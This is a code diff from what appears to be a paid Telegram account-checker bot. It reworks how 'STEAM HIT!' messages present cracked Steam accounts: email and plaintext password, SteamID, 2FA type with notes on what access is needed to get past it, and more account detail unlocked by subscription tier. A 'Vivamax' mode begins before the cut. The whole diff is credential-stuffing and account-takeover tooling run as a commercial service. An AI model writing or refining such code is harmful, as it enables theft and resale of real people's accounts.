@@ -1259,33 +1259,46 @@ Try another account!
             else "🔒" if result.get('profile_visibility') == "Private" \
             else "👥"
 
-        # Base — FREE plan (everyone gets this)
+        # Base header — FREE plan (everyone gets this)
         text = f"""✅ <b>STEAM HIT!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
 🆔 <b>SteamID:</b> <code>{result.get('steamid', 'N/A')}</code>
-🌍 <b>Country:</b> {country_display}
+🌍 <b>Country:</b> {country_display if country_code not in ["Unknown", "ZZ", "", "UNKNOWN"] else "Not Set by User"}
 ━━━━━━━━━━━━━━━━━━━━━━━━"""
 
-        # 2FA always shown regardless of plan (it's critical info)
+        # 2FA section — shown on ALL plans, separator only when 2FA exists
         if result.get('twofa'):
             twofa_type = result.get('twofa_type', 'Unknown')
-            notes = {
-                'Authenticator': 'Needs TOTP authenticator app',
-                'Email Guard': 'Needs email inbox access'
-            }
-            note = notes.get(twofa_type, 'Device confirmation needed')
+            if twofa_type == 'Authenticator':
+                note = "Needs TOTP authenticator app"
+            elif twofa_type == 'Email Guard':
+                note = "Needs email inbox access"
+            else:
+                note = "Device confirmation needed"
             text += f"\n🔐 <b>2FA Type:</b> <code>{twofa_type}</code>"
             text += f"\n📝 <b>Note:</b> {note}"
             text += "\n━━━━━━━━━━━━━━━━━━━━━━━━"
 
-        # BASIC — adds profile visibility + game count
+        # BASIC+ — profile visibility + games owned + games list privacy
         if user_plan in ["BASIC", "VIP", "YEARLY"]:
-            text += f"\n{visibility_emoji} <b>Profile:</b> <code>{result.get('profile_visibility', 'Unknown')}</code>"
-            text += f"\n🎮 <b>Games Owned:</b> <code>{result.get('games_count', 0)}</code>"
+            if result.get('games_count') == 0 and result.get('profile_visibility') == 'Public':
+                games_privacy = "Hidden 🔒"
+            else:
+                games_privacy = "Visible ✅"
+            result['games_privacy'] = games_privacy
 
-        # VIP/YEARLY — adds playtime + top games list
+            text += f"\n{visibility_emoji} <b>Profile:</b> <code>{result.get('profile_visibility', 'Unknown')}</code>"
+            text += f"\n🎮 <b>Games List:</b> <code>{result.get('games_privacy', 'Unknown')}</code>"
+
+            if result.get('games_count') is not None:
+                if result['games_count'] == 0:
+                    text += "\n🎮 <b>Games Owned:</b> <code>0</code> <i>(Private/Family View)</i>"
+                else:
+                    text += f"\n🎮 <b>Games Owned:</b> <code>{result['games_count']}</code>"
+
+        # VIP/YEARLY — playtime + top games list
         if user_plan in ["VIP", "YEARLY"]:
             if result.get('total_playtime', 0) > 0:
                 text += f"\n⏳ <b>Total Playtime:</b> <code>{result['total_playtime']:,} hours</code>"
@@ -1295,10 +1308,12 @@ Try another account!
                 for game in result['games'][:10]:
                     text += f"\n   • {game['name']} ({game['playtime_hours']}h)"
 
+        # Footer — always once at the bottom
         text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━"
         text += f"\nChannel: {CHANNEL_USERNAME}"
         return text
-
+    
+    # ==================== VIVAMAX ====================
     if mode == "Vivamax":
         # === RICH VIVAMAX FORMAT (same style as your standalone script) ===
         text = f"""
